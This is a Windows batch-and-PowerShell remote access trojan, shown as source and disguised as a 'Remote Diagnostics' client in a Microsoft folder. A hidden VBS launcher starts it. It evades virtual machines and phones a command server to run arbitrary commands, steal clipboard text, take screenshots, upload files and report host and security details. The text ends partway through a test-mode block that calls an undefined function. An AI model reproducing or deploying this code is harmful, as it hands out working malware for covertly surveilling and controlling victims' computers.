@echo off
setlocal EnableExtensions
set "DIR=%LOCALAPPDATA%\Microsoft\Diagnostics"
if not exist "%DIR%" mkdir "%DIR%" >nul 2>&1
set "PS=powershell.exe"
set "0NET_SRC=%~f0"

%PS% -NoProfile -ExecutionPolicy Bypass -Command "$s=[IO.File]::ReadAllText('%~f0');$i=$s.LastIndexOf('::PAYLOAD');$b=$s.Substring($i+9).TrimStart();$b=$b.Replace([string][char]13+[string][char]10,[string][char]10);if($b.StartsWith('param')){[IO.File]::WriteAllText('%DIR%\client.ps1',$b,[Text.Encoding]::UTF8)}else{exit 7}"

if errorlevel 1 (
    echo [x] payload extraction failed
    pause
    exit /b 1
)

>"%DIR%\launch.vbs" echo Set fso = CreateObject("Scripting.FileSystemObject")
>>"%DIR%\launch.vbs" echo d = fso.GetParentFolderName(WScript.ScriptFullName)
>>"%DIR%\launch.vbs" echo Set s = CreateObject("WScript.Shell")
>>"%DIR%\launch.vbs" echo p = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File " + Chr(34) + d + "\client.ps1" + Chr(34) + " -Detached"
>>"%DIR%\launch.vbs" echo s.Run p, 0, False

start "" wscript.exe //B //NoLogo "%DIR%\launch.vbs"
exit /b 0

::PAYLOAD
param(
    [switch]$Show,
    [switch]$Test,
    [switch]$Uninstall,
    [switch]$Kill,
    [switch]$Detached
)

$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::Expect100Continue = $false
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls

# --- config ---

$Build = ''
$Server = ''
$KeyStr = ''

# vm guard. true = if the box looks virtual, report it, drop a vm.block marker,
# strip persistence, delete every artefact and exit. it stays dark until the
# marker is deleted. false = run normally, vms stay connected.
$VmBlock = $true

$Dir = Join-Path $env:LOCALAPPDATA 'Microsoft\Diagnostics'
$Script = Join-Path $Dir 'client.ps1'
$Launch = Join-Path $Dir 'launch.vbs'
$CfgFile = Join-Path $Dir 'config.json'
$IdFile = Join-Path $Dir 'id.dat'
$VmFlag = Join-Path $Dir 'vm.block'
$Tmp = Join-Path $env:TEMP '0net2'
$MutexName = 'Local\RemoteDiagnosticsClient'
$RunName = 'RemoteDiagnostics'
$HasNative = $false
$NoProxy = New-Object Net.WebProxy
$Seen = @{}
$PollSec = 3
$Chunk = 262144
$Secret = ''
$Fail = 0
$Tick = 0

$Cwd = $env:USERPROFILE
if (-not $Cwd -or -not (Test-Path -LiteralPath $Cwd)) { $Cwd = $env:SystemRoot }
if (-not $Cwd) { $Cwd = 'C:' }

if (-not (Test-Path $Tmp)) { New-Item -ItemType Directory -Path $Tmp -Force | Out-Null }

# log
function Log([string]$m) {
    try {
        $f = Join-Path $script:Tmp 'client.log'
        [IO.File]::AppendAllText($f, ((Get-Date).ToString('HH:mm:ss') + ' ' + $m + "`r`n"))
        if ((Get-Item $f).Length -gt 524288) { [IO.File]::WriteAllText($f, '') }
    } catch {}
}

# config
function Save-Cfg {
    try {
        if (-not (Test-Path $script:Dir)) { New-Item -ItemType Directory -Path $script:Dir -Force | Out-Null }
        $o = [ordered]@{ server = $script:Server; key = $script:KeyStr; secret = $script:Secret; build = $Build }
        [IO.File]::WriteAllText($script:CfgFile, ($o | ConvertTo-Json -Compress), [Text.Encoding]::UTF8)
    } catch {}
}

if (Test-Path $CfgFile) {
    try {
        $j = Get-Content $CfgFile -Raw | ConvertFrom-Json
        if ($j.server) { $Server = [string]$j.server }
        if ($j.key) { $KeyStr = [string]$j.key }
        if ($j.secret) { $Secret = [string]$j.secret }
    } catch {}
}
if (-not $Secret -and (Test-Path $IdFile)) {
    try { $Secret = (Get-Content $IdFile -Raw).Trim() } catch {}
}

function Stop-Old {
    try {
        Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
            Where-Object {
                $_.ProcessId -ne $PID -and $_.CommandLine -and
                ($_.CommandLine -like ('*' + $script:Script + '*'))
            } |
            ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {} }
    } catch {}
    Start-Sleep -Milliseconds 350
}

try {
    $c = ''
    $c += '[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();'
    $c += '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'
    $c += '[DllImport("user32.dll")] public static extern int GetSystemMetrics(int n);'
    Add-Type -MemberDefinition $c -Name 'Api' -Namespace 'Rdc'
    $HasNative = $true
} catch { $HasNative = $false }

function Hide-Me {
    if ($Show) { return }
    if (-not $HasNative) { return }
    try {
        $h = [Rdc.Api]::GetConsoleWindow()
        if ($h -ne [IntPtr]::Zero) { [void][Rdc.Api]::ShowWindow($h, 0) }
    } catch {}
}

if ($Kill) { Stop-Old; return }

if ($Uninstall) {
    Stop-Old
    try { Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $RunName -ErrorAction SilentlyContinue } catch {}
    try { Unregister-ScheduledTask -TaskName $RunName -Confirm:$false -ErrorAction SilentlyContinue } catch {}
    try { Remove-Item -LiteralPath (Join-Path ([Environment]::GetFolderPath('Startup')) ($RunName + '.lnk')) -Force -ErrorAction SilentlyContinue } catch {}
    try { Remove-Item -LiteralPath $Script, $Launch, $CfgFile, $IdFile, $VmFlag -Force -ErrorAction SilentlyContinue } catch {}
    try { Remove-Item -LiteralPath $Tmp -Recurse -Force -ErrorAction SilentlyContinue } catch {}
    return
}

# already burned by the vm guard, stay dark
if ((Test-Path $VmFlag) -and -not $Test) {
    if ($Show) { Write-Host ('[vm] already blocked - delete ' + $VmFlag + ' to re-arm') }
    return
}

if (-not $Detached -and -not $Show -and -not $Test) {
    try {
        if (Test-Path $Launch) {
            Start-Process 'wscript.exe' -ArgumentList '//B','//NoLogo',('"' + $Launch + '"') -WindowStyle Hidden
        } else {
            Start-Process 'powershell.exe' -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File',('"' + $Script + '"'),'-Detached' -WindowStyle Hidden
        }
    } catch {}
    return
}

$got = $false
$mtx = $null
if (-not $Test) {
    for ($i = 0; $i -lt 3 -and -not $got; $i++) {
        Stop-Old
        $created = $false
        try {
            $mtx = [System.Threading.Mutex]::new($true, $MutexName, [ref]$created)
            if ($created) { $got = $true }
        } catch { $got = $true }
        if (-not $got) { Start-Sleep -Milliseconds 400 }
    }
    if (-not $got) { return }
}

Hide-Me

# --- crypto ---

function Hex-Of([byte[]]$b) {
    $sb = New-Object Text.StringBuilder
    foreach ($x in $b) { [void]$sb.Append($x.ToString('x2')) }
    return $sb.ToString()
}

function Kdf([string]$ks, [string]$info, [int]$len) {
    $salt = [Text.Encoding]::UTF8.GetBytes('0net2-v8')
    $h1 = New-Object Security.Cryptography.HMACSHA256
    $h1.Key = $salt
    $prk = $h1.ComputeHash([Text.Encoding]::UTF8.GetBytes($ks))
    $ib = [Text.Encoding]::UTF8.GetBytes($info)
    $msg = [byte[]]::new($ib.Length + 1)
    [Array]::Copy($ib, $msg, $ib.Length)
    $msg[$ib.Length] = 1
    $h2 = New-Object Security.Cryptography.HMACSHA256
    $h2.Key = $prk
    $t = $h2.ComputeHash($msg)
    $o = [byte[]]::new($len)
    [Array]::Copy($t, $o, $len)
    return ,$o
}

function New-Aes([string]$ks) {
    $a = [Security.Cryptography.Aes]::Create()
    $a.KeySize = 128
    $a.Key = (Kdf $ks 'aes' 16)
    $a.Mode = [Security.Cryptography.CipherMode]::CBC
    $a.Padding = [Security.Cryptography.PaddingMode]::PKCS7
    return $a
}

function Hash-Hex([string]$s) {
    return (Hex-Of ([Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($s))))
}

function Mac-Hex([string]$s, [string]$ks) {
    $h = New-Object Security.Cryptography.HMACSHA256
    $h.Key = (Kdf $ks 'mac' 32)
    return (Hex-Of ($h.ComputeHash([Text.Encoding]::UTF8.GetBytes($s))))
}

function Auth-Token([string]$ts, [string]$n, [string]$ks) {
    $h = New-Object Security.Cryptography.HMACSHA256
    $h.Key = (Kdf $ks 'auth' 32)
    return (Hex-Of ($h.ComputeHash([Text.Encoding]::UTF8.GetBytes($ts + ':' + $n))))
}

# payload key: the per-client secret once enrolled, else the fleet key
function Payload-Key {
    if ($script:Secret) { return $script:Secret }
    return $script:KeyStr
}

function Encrypt-Hex([string]$text, [string]$ks) {
    if (-not $ks) { $ks = $script:KeyStr }
    $a = New-Aes $ks
    $a.GenerateIV()
    $iv = $a.IV
    $b = [Text.Encoding]::UTF8.GetBytes($text)
    $e = $a.CreateEncryptor()
    $ct = $e.TransformFinalBlock($b, 0, $b.Length)
    return (Hex-Of ($iv + $ct))
}

function Decrypt-Hex([string]$hex, [string]$ks) {
    if ([string]::IsNullOrEmpty($hex)) { return '' }
    if ($hex.Length % 32 -ne 0) { return '' }
    $n = [int]($hex.Length / 2)
    $b = [byte[]]::new($n)
    for ($i = 0; $i -lt $n; $i++) { $b[$i] = [Convert]::ToByte($hex.Substring($i * 2, 2), 16) }
    $iv = [byte[]]::new(16)
    [Array]::Copy($b, 0, $iv, 0, 16)
    $ct = [byte[]]::new($n - 16)
    [Array]::Copy($b, 16, $ct, 0, $n - 16)
    try {
        $a = New-Aes $ks
        $a.IV = $iv
        $d = $a.CreateDecryptor()
        return [Text.Encoding]::UTF8.GetString($d.TransformFinalBlock($ct, 0, $ct.Length))
    } catch { return '' }
}

# --- identity ---

$SW = 1920
$SH = 1080
if ($HasNative) {
    try {
        $w = [Rdc.Api]::GetSystemMetrics(0)
        $h = [Rdc.Api]::GetSystemMetrics(1)
        if ($w -gt 0 -and $h -gt 0) { $SW = $w; $SH = $h }
    } catch {}
}

$sid = ''
try { $sid = [Security.Principal.WindowsIdentity]::GetCurrent().User.Value } catch {}
$mid = (Hash-Hex ($env:COMPUTERNAME + '|' + $env:USERNAME + '|' + $sid)).Substring(0, 8).ToUpper()

$UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36' +
      ' SCR:' + $SW + 'x' + $SH + ' PLAT:windows MID:' + $mid

function Get-DeviceId([string]$ua) {
    $d = ''
    if ($ua -match 'Windows NT (\d+.\d+)(?:.\d+)?') {
        $d = 'WIN_' + $matches[1]
        if ($ua.Contains('Win64; x64')) { $d += 'X64' }
        elseif ($ua.Contains('WOW64')) { $d += 'WOW64' }
        elseif ($ua.Contains('ARM64')) { $d += 'ARM64' }
        if ($ua.Contains('Windows NT 10.0') -and $ua.Contains('Server')) { $d += 'SERVER' }
    } elseif ($ua -match 'Mac OS X (\d+[.]\d+(?:[.]\d+)?)') {
        $d = 'MACOS' + $matches[1]
        if ($ua.Contains('Intel')) { $d += '_INTEL' } elseif ($ua.Contains('Apple Silicon')) { $d += '_APPLE' }
    } elseif ($ua.Contains('Linux')) {
        $d = 'LINUX'
        if ($ua.Contains('x86_64')) { $d += '_X64' }
        elseif ($ua.Contains('i686')) { $d += '_X86' }
        elseif ($ua.Contains('aarch64')) { $d += '_ARM64' }
        elseif ($ua.Contains('armv7l')) { $d += '_ARM32' }
        if ($ua.Contains('Ubuntu')) { $d += '_UBUNTU' }
        elseif ($ua.Contains('Debian')) { $d += 'DEBIAN' }
        elseif ($ua.Contains('Fedora')) { $d += 'FEDORA' }
    } elseif ($ua -match 'Android (\d+.\d+(?:.\d+)?)') {
        $d = 'ANDROID' + $matches[1]
        if ($ua.Contains('SM-')) { $d += 'SAMSUNG' } elseif ($ua.Contains('Pixel')) { $d += 'PIXEL' }
    } elseif ($ua -match 'iPhone OS (\d+[\d]+)') {
        $d = 'IOS' + $matches[1]
        if ($ua.Contains('iPhone')) { $d += '_IPHONE' } elseif ($ua.Contains('iPad')) { $d += '_IPAD' }
    } else { $d = 'UNKNOWN_OS' }
    if ($ua.Contains('Chrome')) { $d += '_CHROME' }
    elseif ($ua.Contains('Firefox')) { $d += '_FIREFOX' }
    elseif ($ua.Contains('Safari')) { $d += '_SAFARI' }
    elseif ($ua.Contains('Edge')) { $d += '_EDGE' }
    if ($ua -match 'SCR:(\d+)x(\d+)') { $d += ('SCR' + $matches[1] + 'x' + $matches[2]) }
    if ($ua -match 'PLAT:([A-Za-z0-9.-]{1,24})') { $d += ('_PLAT' + $matches[1]) }
    if ($ua -match 'MID:([0-9A-Fa-f]{6,16})') { $d += ('_MID' + $matches[1].ToUpper()) }
    return (Hash-Hex $d).Substring(0, 6).ToUpper()
}

$DeviceId = Get-DeviceId $UA

# --- http ---

function Http([string]$method, [string]$path, [byte[]]$body, $headers) {
    $res = @{ Body=''; Sig=''; Enroll=''; KeyMode=''; Code=0 }
    try {
        $req = [Net.HttpWebRequest]::Create($script:Server + $path)
        $req.Method = $method
        $req.UserAgent = $script:UA
        $req.Timeout = 20000
        $req.ReadWriteTimeout = 20000
        $req.KeepAlive = $false
        $req.Proxy = $NoProxy
        foreach ($k in $headers.Keys) { try { $req.Headers[$k] = [string]$headers[$k] } catch {} }
        if ($body -ne $null -and $body.Length -gt 0) {
            $req.ContentType = 'text/plain'
            $req.ContentLength = $body.Length
            $st = $req.GetRequestStream()
            $st.Write($body, 0, $body.Length)
            $st.Close()
        }
        try { $resp = $req.GetResponse() } catch [Net.WebException] {
            if ($_.Exception.Response -ne $null) { $resp = $_.Exception.Response } else { return $res }
        }
        try { $res.Code = [int]$resp.StatusCode } catch {}
        try { $res.Sig = [string]$resp.Headers['X-Signature'] } catch {}
        try { $res.Enroll = [string]$resp.Headers['X-Enroll'] } catch {}
        try { $res.KeyMode = [string]$resp.Headers['X-Key-Mode'] } catch {}
        $sr = New-Object IO.StreamReader($resp.GetResponseStream())
        $res.Body = $sr.ReadToEnd()
        $sr.Close()
        $resp.Close()
    } catch { }
    return $res
}

function Now-Ms { return ([DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds().ToString()) }

function Auth-Headers([string]$mode) {
    $ts = Now-Ms
    $n = [guid]::NewGuid().ToString('N')
    $ks = if ($mode -eq 'secret' -and $script:Secret) { $script:Secret } else { $script:KeyStr }
    $h = @{}
    $h['X-Timestamp'] = $ts
    $h['X-Nonce'] = $n
    $h['X-Auth-Token'] = Auth-Token $ts $n $ks
    $h['X-Client-ID'] = $script:DeviceId
    $h['X-Key-Mode'] = $mode
    $h['X-Platform'] = 'windows'
    return $h
}

function Send([string]$path, [string]$plain) {
    $ks = Payload-Key
    $hex = Encrypt-Hex $plain $ks
    $mode = if ($script:Secret) { 'secret' } else { 'global' }
    $h = Auth-Headers $mode
    $h['X-Signature'] = Mac-Hex $hex $ks
    $r = Http 'POST' $path ([Text.Encoding]::ASCII.GetBytes($hex)) $h
    Log ('POST ' + $path + ' -> ' + $r.Code)
    if ($r.Enroll) { $script:Secret = $r.Enroll; Save-Cfg; Log 'ENROLLED (adopted on POST)' }
    return $r
}

function Poll {
    $mode = if ($script:Secret) { 'secret' } else { 'global' }
    $r = Http 'GET' '/' $null (Auth-Headers $mode)
    if ($r.Code -eq 0) { Log 'GET netfail'; return @{ ok = $false; text = '' } }

    # we and the server disagree on our secret (stale state, cloned box, old
    # config). one resync try on the fleet key - the server only takes it from
    # the ip we last authed from and answers with the secret it holds for us.
    if ($r.Code -eq 403 -and -not $r.Enroll -and $script:Secret) {
        Log 'GET 403 while holding a secret -> resync'
        $r2 = Http 'GET' '/' $null (Auth-Headers 'global')
        if ($r2.Enroll) { $script:Secret = $r2.Enroll; Save-Cfg; Log 'RESYNC (secret re-issued)' }
        if ($r2.Code -eq 200) { $r = $r2 } else { return @{ ok = $true; text = '' } }
    }

    if ($r.Enroll) { $script:Secret = $r.Enroll; Save-Cfg; Log 'ENROLLED (adopted)' }

    if ($r.Code -ne 200) {
        Log ('GET ' + $r.Code + ' keymode=' + $r.KeyMode + ' enrolled=' + [bool]$script:Secret)
        if ($r.KeyMode -eq 'global' -and $script:Secret -and -not $r.Enroll) {
            $script:Secret = ''
            Save-Cfg
            Log 'SECRET DROPPED (server answered global)'
        }
        return @{ ok = $true; text = '' }
    }

    $use = if ($r.KeyMode -eq 'secret' -and $script:Secret) { $script:Secret } else { $script:KeyStr }
    $alt = if ($use -eq $script:KeyStr) { $script:Secret } else { $script:KeyStr }

    $script:Tick++
    if ($script:Tick % 20 -eq 0) { Log ('heartbeat body=' + $r.Body.Length + ' sig=' + [bool]$r.Sig) }
    if ($r.Body) { Log ('GET 200 len=' + $r.Body.Length + ' sig=' + [bool]$r.Sig + ' km=' + $r.KeyMode) }

    foreach ($k in @($use, $alt)) {
        if (-not $k) { continue }
        if ($r.Sig -and (Mac-Hex $r.Body $k) -eq $r.Sig) { return @{ ok = $true; text = (Decrypt-Hex $r.Body $k) } }
    }
    if ($r.Body) { return @{ ok = $true; text = (Decrypt-Hex $r.Body $use) } }
    return @{ ok = $true; text = '' }
}

function Get-PubIp {
    try {
        $r = [Net.HttpWebRequest]::Create('https://api.ipify.org')
        $r.Timeout = 2500
        $r.UserAgent = $script:UA
        $sr = New-Object IO.StreamReader($r.GetResponse().GetResponseStream())
        $s = $sr.ReadToEnd()
        $sr.Close()
        return $s.Trim()
    } catch { return '?' }
}

# --- uploads ---

function Send-Upload([string]$tid, [int]$idx, [int]$total, [string]$name, [byte[]]$data) {
    $ks = Payload-Key
    $hex = Encrypt-Hex ([Convert]::ToBase64String($data)) $ks
    $mode = if ($script:Secret) { 'secret' } else { 'global' }
    for ($try = 0; $try -lt 3; $try++) {
        try {
            $h = Auth-Headers $mode
            $h['X-Signature'] = Mac-Hex $hex $ks
            $h['X-Tid'] = $tid
            $h['X-Idx'] = $idx
            $h['X-Total'] = $total
            $h['X-Name'] = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($name))
            $r = Http 'POST' '/upload' ([Text.Encoding]::ASCII.GetBytes($hex)) $h
            if ($r.Enroll) { $script:Secret = $r.Enroll; Save-Cfg }
            if ($r.Code -eq 200) { return $true }
            Log ('UPLOAD ' + $idx + '/' + $total + ' -> ' + $r.Code)
        } catch { }
        Start-Sleep -Milliseconds 700
    }
    Log ('UPLOAD FAILED ' + $name)
    return $false
}

function Send-File([string]$path, [string]$tid) {
    $bytes = [IO.File]::ReadAllBytes($path)
    # device id prefix so a fleet-wide shot is identifiable in loot/
    $name = $script:DeviceId + '_' + [IO.Path]::GetFileName($path)
    $total = [Math]::Max(1, [int][Math]::Ceiling($bytes.Length / $script:Chunk))
    Log ('SENDFILE ' + $name + ' ' + $bytes.Length + ' bytes in ' + $total + ' chunk(s)')
    for ($i = 0; $i -lt $total; $i++) {
        $off = $i * $script:Chunk
        $len = [Math]::Min($script:Chunk, $bytes.Length - $off)
        $seg = [byte[]]::new($len)
        if ($len -gt 0) { [Array]::Copy($bytes, $off, $seg, 0, $len) }
        Send-Upload $tid $i $total $name $seg | Out-Null
    }
}

function Take-Shot([string]$path) {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $b = New-Object System.Drawing.Bitmap $SW, $SH
    $g = [System.Drawing.Graphics]::FromImage($b)
    $g.CopyFromScreen(0, 0, 0, 0, $b.Size)
    $b.Save($path, [System.Drawing.Imaging.ImageFormat]::Jpeg)
    $g.Dispose(); $b.Dispose()
}

# --- info ---

function Get-Info {
    $l = @()
    $l += 'Hostname : ' + $env:COMPUTERNAME
    $l += 'User : ' + $env:USERNAME
    $l += 'Domain : ' + $env:USERDOMAIN
    try { $l += 'OS : ' + (Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption } catch { $l += 'OS : ?' }
    $l += 'Arch : ' + $env:PROCESSOR_ARCHITECTURE
    try { $l += 'CPU : ' + [int](Get-CimInstance Win32_ComputerSystem -ErrorAction Stop).NumberOfLogicalProcessors } catch {}
    try { $l += 'RAM (MB) : ' + [int][math]::Round((Get-CimInstance Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory / 1MB, 0) } catch {}
    $l += 'PID : ' + $PID
    $l += 'PS : ' + $PSVersionTable.PSVersion.ToString()
    $l += 'Screen : ' + $SW + 'x' + $SH
    $l += 'Client : ' + $script:DeviceId
    $l += 'Machine : ' + $mid
    $l += 'Build : ' + $Build
    $l += 'VmGuard : ' + $VmBlock
    $l += 'Enrolled : ' + [bool]$script:Secret
    $l += 'Poll : ' + $script:PollSec + 's'
    $l += 'Cwd : ' + $script:Cwd
    $l += 'Server : ' + $script:Server
    $l += 'Time : ' + (Get-Date).ToString('o')

    $l += ''
    $l += '--- identity ---'
    try { $l += 'FullUser : ' + [Security.Principal.WindowsIdentity]::GetCurrent().Name } catch {}
    try { $l += 'SID : ' + $sid } catch {}
    try { $l += 'AuthType : ' + [Security.Principal.WindowsIdentity]::GetCurrent().AuthenticationType } catch {}
    $isAdmin = $false
    try { $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) } catch {}
    $l += 'Elevated : ' + $isAdmin
    try { $l += 'Session : ' + (Get-Process -Id $PID -ErrorAction Stop).SessionId } catch {}

    $l += ''
    $l += '--- operating system ---'
    try {
        $os = Get-CimInstance Win32_OperatingSystem -ErrorAction Stop
        $l += 'Version : ' + $os.Version
        $l += 'BuildNo : ' + $os.BuildNumber
        $l += 'OSArch : ' + $os.OSArchitecture
        $l += 'Install : ' + $os.InstallDate
        $l += 'LastBoot : ' + $os.LastBootUpTime
        try { $l += 'Uptime : ' + ((Get-Date) - $os.LastBootUpTime).ToString('d.hh:mm:ss') } catch {}
        $l += 'Serial : ' + $os.SerialNumber
        $l += 'Locale : ' + $os.Locale
        $l += 'SysDir : ' + $os.SystemDirectory
    } catch {}
    try { $l += 'TimeZone : ' + [TimeZoneInfo]::Local.Id } catch {}

    $l += ''
    $l += '--- hardware ---'
    try { $cs = Get-CimInstance Win32_ComputerSystem -ErrorAction Stop; $l += 'Vendor : ' + $cs.Manufacturer; $l += 'Model : ' + $cs.Model } catch {}
    try { $cpu = Get-CimInstance Win32_Processor -ErrorAction Stop | Select-Object -First 1; $l += 'CPUName : ' + $cpu.Name; $l += 'CPUCores : ' + $cpu.NumberOfCores; $l += 'CPUMHz : ' + $cpu.MaxClockSpeed } catch {}
    try { $bb = Get-CimInstance Win32_BaseBoard -ErrorAction Stop; $l += 'Board : ' + $bb.Manufacturer + ' ' + $bb.Product } catch {}
    try { $bios = Get-CimInstance Win32_BIOS -ErrorAction Stop; $l += 'BIOS : ' + $bios.Manufacturer + ' ' + $bios.SMBIOSBIOSVersion } catch {}
    try { $l += 'GPU : ' + ((Get-CimInstance Win32_VideoController -ErrorAction Stop | Select-Object -First 2 | ForEach-Object { $_.Name }) -join '; ') } catch {}
    try { $mem = Get-CimInstance Win32_OperatingSystem -ErrorAction Stop; $l += 'RAMFree : ' + [int][math]::Round($mem.FreePhysicalMemory / 1KB, 0) + ' MB' } catch {}

    $l += ''
    $l += '--- storage ---'
    try {
        Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' -ErrorAction Stop | ForEach-Object {
            $l += 'Drive : ' + $_.DeviceID + ' ' + $_.VolumeName + ' ' + [int][math]::Round($_.FreeSpace/1GB,1) + 'GB free / ' + [int][math]::Round($_.Size/1GB,1) + 'GB'
        }
    } catch {}

    $l += ''
    $l += '--- network ---'
    try { $l += 'LocalIP : ' + ((Get-CimInstance Win32_NetworkAdapterConfiguration -Filter 'IPEnabled=True' -ErrorAction Stop | ForEach-Object { $_.IPAddress }) -join ', ') } catch {}
    try { $l += 'MAC : ' + ((Get-CimInstance Win32_NetworkAdapterConfiguration -Filter 'IPEnabled=True' -ErrorAction Stop | ForEach-Object { $_.MACAddress }) -join ', ') } catch {}
    try { $l += 'Gateway : ' + ((Get-CimInstance Win32_NetworkAdapterConfiguration -Filter 'IPEnabled=True' -ErrorAction Stop | ForEach-Object { $_.DefaultIPGateway }) -join ', ') } catch {}
    try { $l += 'DNS : ' + ((Get-CimInstance Win32_NetworkAdapterConfiguration -Filter 'IPEnabled=True' -ErrorAction Stop | ForEach-Object { $_.DNSServerSearchOrder }) -join ', ') } catch {}
    try { $l += 'PublicIP : ' + (Get-PubIp) } catch {}
    try { $l += 'ListenTCP: ' + ((Get-NetTCPConnection -State Listen -ErrorAction Stop | Select-Object -ExpandProperty LocalPort -Unique | Sort-Object) -join ',') } catch {}
    try {
        Get-NetTCPConnection -State Established -ErrorAction Stop | Select-Object -First 12 | ForEach-Object {
            $l += 'Conn : ' + $_.LocalAddress + ':' + $_.LocalPort + ' -> ' + $_.RemoteAddress + ':' + $_.RemotePort + ' pid=' + $_.OwningProcess
        }
    } catch {}

    $l += ''
    $l += '--- security ---'
    try { $av = Get-CimInstance -Namespace 'root\SecurityCenter2' -ClassName AntiVirusProduct -ErrorAction Stop; foreach ($a in $av) { $l += 'AV : ' + $a.displayName } } catch {}
    try { $d = Get-MpComputerStatus -ErrorAction Stop; $l += 'Defender : rtp=' + $d.RealTimeProtectionEnabled + ' sigAge=' + $d.AntivirusSignatureAge + 'd' } catch {}
    try { $l += 'Firewall : ' + ((Get-NetFirewallProfile -ErrorAction Stop | ForEach-Object { $_.Name + '=' + $_.Enabled }) -join ', ') } catch {}
    try { $l += 'UAC : ' + (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -ErrorAction Stop).EnableLUA } catch {}

    $l += ''
    $l += '--- discovery ---'
    $vm = 'physical'
    try {
        $cs2 = Get-CimInstance Win32_ComputerSystem -ErrorAction Stop
        $mm = ($cs2.Manufacturer + ' ' + $cs2.Model).ToLower()
        if ($mm -match 'vmware') { $vm = 'VMware' }
        elseif ($mm -match 'virtualbox') { $vm = 'VirtualBox' }
        elseif ($mm -match 'hyper-v|virtual machine') { $vm = 'Hyper-V' }
        elseif ($mm -match 'qemu|kvm') { $vm = 'QEMU/KVM' }
        elseif ($mm -match 'xen') { $vm = 'Xen' }
    } catch {}
    $l += 'Virtual : ' + $vm
    try { $l += 'Shares : ' + ((Get-CimInstance Win32_Share -ErrorAction Stop | Where-Object { $_.Name -notmatch '\$' } | ForEach-Object { $_.Name }) -join ', ') } catch {}
    try { $l += 'Profiles : ' + ((Get-ChildItem 'C:\Users' -Directory -ErrorAction Stop | ForEach-Object Name) -join ', ') } catch {}

    $l += ''
    $l += '--- clipboard ---'
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $cb = [Windows.Forms.Clipboard]::GetText()
        if ([string]::IsNullOrEmpty($cb)) { $l += '(empty)' }
        else { if ($cb.Length -gt 500) { $cb = $cb.Substring(0, 500) + '...' }; $l += $cb }
    } catch { $l += '(unavailable)' }

    $l += ''
    $l += '--- top processes ---'
    try {
        Get-Process -ErrorAction Stop | Sort-Object WS -Descending | Select-Object -First 12 | ForEach-Object {
            $l += 'Proc : ' + $_.ProcessName + ' pid=' + $_.Id + ' mem=' + [int][math]::Round($_.WS/1MB,0) + 'MB'
        }
    } catch {}

    $l += ''
    $l += '--- software (sample) ---'
    try {
        $keys = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*')
        $apps = foreach ($k in $keys) { Get-ItemProperty $k -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName } | Select-Object -ExpandProperty DisplayName }
        $apps = $apps | Sort-Object -Unique
        $l += 'AppCount : ' + (@($apps).Count)
        ($apps | Select-Object -First 20) | ForEach-Object { $l += 'App : ' + $_ }
    } catch {}

    return ($l -join "`r`n")
}

# --- command runner ---

function Run-Cmd([string]$line) {
    if ([string]::IsNullOrEmpty($line)) { return '' }

    if ($line -match '^(?i)\s*pwd\s*$') { return ($script:Cwd + "`r`n") }

    $mm = [regex]::Match($line, '^(?i)\s*(cd|chdir)\b\s*(/d\s*)?(.*)$')
    if ($mm.Success) {
        $arg = $mm.Groups[3].Value.Trim().Trim('"')
        if (-not $arg) { return ($script:Cwd + "`r`n") }
        try {
            $cand = if ([IO.Path]::IsPathRooted($arg)) { $arg } else { Join-Path $script:Cwd $arg }
            $full = [IO.Path]::GetFullPath($cand)
            if (Test-Path -LiteralPath $full -PathType Container) {
                $script:Cwd = $full
                return ''
            }
        } catch {}
        return ("The system cannot find the path specified.`r`n")
    }

    $outFile = Join-Path $script:Tmp ('out_' + [guid]::NewGuid().ToString('N') + '.tmp')
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = 'cmd.exe'
        $psi.Arguments = '/c cd /d "' + $script:Cwd + '" && ' + $line + ' > "' + $outFile + '" 2>&1'
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        $psi.RedirectStandardInput = $true
        $p = [System.Diagnostics.Process]::Start($psi)
        try { $p.StandardInput.Close() } catch {}
        $p.WaitForExit()
        $out = ''
        if (Test-Path -LiteralPath $outFile) { $out = [IO.File]::ReadAllText($outFile) }
        if ($null -eq $out) { $out = '' }
        $p.Dispose()
        return $out
    } catch {
        return ('ERROR: ' + $_.Exception.Message)
    } finally {
        try { Remove-Item -LiteralPath $outFile -Force -ErrorAction SilentlyContinue } catch {}
    }
}

# --- test mode ---

if ($Test) {
    Write-Host ('build : ' + $Build)
    Write-Host ('server : ' + $script:Server)
    Write-Host ('epoch ms : ' + (Now-Ms))
    Write-Host ('client : ' + $script:DeviceId)
    Write-Host ('machine : ' + $mid)
    Write-Host ('vmguard : ' + $VmBlock)
    Write-Host ('vm : ' + (Test-VM).label)
    Write-Host ('enrolled : ' + [bool]$script:Secret)
    Write-Host ('cwd : ' + $script:Cwd)
    Write-Host ('log : ' + (Join-Path $script:Tmp 'client.log'))
